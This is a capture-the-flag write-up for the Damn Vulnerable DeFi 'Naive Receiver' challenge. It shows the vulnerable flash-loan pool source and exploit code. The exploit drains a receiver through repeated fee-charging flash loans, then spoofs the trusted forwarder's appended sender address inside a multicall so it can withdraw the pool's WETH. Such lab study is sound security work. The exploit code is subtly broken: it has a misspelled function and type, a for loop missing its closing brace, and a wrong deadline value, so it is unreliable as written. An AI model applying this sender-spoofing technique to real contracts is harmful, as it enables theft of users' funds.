### Problem statement

Thereâ€™s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.


*src>naive-receiver>NaiveReceiverPool.sol 

```js
// SPDX-License-Identifier: MIT

// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)

pragma solidity =0.8.25;

  

import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";

import {Multicall} from "./Multicall.sol";

import {WETH} from "solmate/tokens/WETH.sol";

  

contract NaiveReceiverPool is Multicall, IERC3156FlashLender {

// c! fee to be paid

uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan

// hash that should be returned

bytes32 private constant CALLBACK_SUCCESS =

keccak256("ERC3156FlashBorrower.onFlashLoan");

  

WETH public immutable weth;

address public immutable trustedForwarder;

address public immutable feeReceiver;

  

mapping(address => uint256) public deposits;

uint256 public totalDeposits;

  

error RepayFailed();

error UnsupportedCurrency();

error CallbackFailed();

  

constructor(

address _trustedForwarder,

address payable _weth,

address _feeReceiver

) payable {

weth = WETH(_weth);

trustedForwarder = _trustedForwarder;

feeReceiver = _feeReceiver;

_deposit(msg.value);

}

  

function maxFlashLoan(address token) external view returns (uint256) {

if (token == address(weth)) return weth.balanceOf(address(this));

return 0;

}

  

// This returns the fixed fee also checks if the token in question is WETH

function flashFee(address token, uint256) external view returns (uint256) {

if (token != address(weth)) revert UnsupportedCurrency();

return FIXED_FEE;

}

  

// e! no checks for who calls this function

function flashLoan(

IERC3156FlashBorrower receiver,

address token,

uint256 amount,

bytes calldata data

) external returns (bool) {

// allows only WETH

if (token != address(weth)) revert UnsupportedCurrency();

  

// Transfer WETH and handle control to receiver

weth.transfer(address(receiver), amount);

totalDeposits -= amount;

  

if (

receiver.onFlashLoan(

msg.sender,

address(weth),

amount,

FIXED_FEE,

data

) != CALLBACK_SUCCESS

) {

revert CallbackFailed();

}

  

uint256 amountWithFee = amount + FIXED_FEE;

weth.transferFrom(address(receiver), address(this), amountWithFee);

totalDeposits += amountWithFee;

  

deposits[feeReceiver] += FIXED_FEE;

  

return true;

}

  

function withdraw(uint256 amount, address payable receiver) external {

// Reduce deposits

deposits[_msgSender()] -= amount;

totalDeposits -= amount;

  

// Transfer ETH to designated receiver

weth.transfer(receiver, amount);

}

  

function deposit() external payable {

_deposit(msg.value);

}

  

function _deposit(uint256 amount) private {

weth.deposit{value: amount}();

  

deposits[_msgSender()] += amount;

totalDeposits += amount;

}

  

function _msgSender() internal view override returns (address) {

if (msg.sender == trustedForwarder && msg.data.length >= 20) {

return address(bytes20(msg.data[msg.data.length - 20:]));

} else {

return super._msgSender();

    }

   }

}
```



## Attack strategy


```js
function withdraw(uint256 amount, address payable receiver) external {

// Reduce deposits

deposits[_msgSender()] -= amount;

totalDeposits -= amount;

  

// Transfer ETH to designated receiver

weth.transfer(receiver, amount);

}

  

function deposit() external payable {

_deposit(msg.value);

}

  

function _deposit(uint256 amount) private {

weth.deposit{value: amount}();

  

deposits[_msgSender()] += amount;

totalDeposits += amount;

}

  

function _msgSender() internal view override returns (address) {

if (msg.sender == trustedForwarder && msg.data.length >= 20) {

return address(bytes20(msg.data[msg.data.length - 20:]));

} else {

return super._msgSender();

}

}
```

based on the fact that `msg.sender` has to be a trusted forwarder if we can manage to call the `withdraw` or `deposit` function from a trusted forwarder then we've arrived at our destination but how do we achieve this? 

```js
// SPDX-License-Identifier: MIT

// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)

pragma solidity =0.8.25;

  

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

import {Context} from "@openzeppelin/contracts/utils/Context.sol";

  

abstract contract Multicall is Context {

// natspec needed here what does this function do

function multicall(

bytes[] calldata data

) external virtual returns (bytes[] memory results) {

  

results = new bytes[](data.length);

  

// Allows anyOne to perform arbituary internal calls asfar as they encode it

for (uint256 i = 0; i < data.length; i++) {

results[i] = Address.functionDelegateCall(address(this), data[i]);

}

return results;

}

}
```


This allows us to call arbitrary internal functions 



```js
...
bytes[] memory encodedCalls = new bytes[](11);
// call flashloan 
for(uint i = 0; i < 10; i++){
	encodedCalls[i] = abi.encodeCall(NaiveReceiverPool.flashloan, (receiver, adress(weth), 0, "0x1"));

encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))),  
bytes32(uint256(uint160(deployer)))  
);  
  
// Encode the multicall data  
bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);  
  
// Create the request  
BasicForwarder.Request memory request = BasicForwarder.Request({  
from: player,  
target: address(pool),  
value: 0,  
gas: gasleft(),  
nonce: forwarder.nonces(player),  
data: multicallData,  
deadline: 1 days  
});  
  
// Hash the request using EIP712 standard of hashing 
bytes32 requestHash = keccak256(abi.encodePacked(  
"\x19\x01",  
forwarder.domainSeparator(),  
forwarder.getDataHash(request)  
)  
);  
  
// Sign the request  
(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);  

// check [[ECDSA]] for more info about this
bytes memory signature = abi.encodePacked(r, s, v);  
  
// Execute the transaction  
forwarder.execute(request, signature);  
}
```
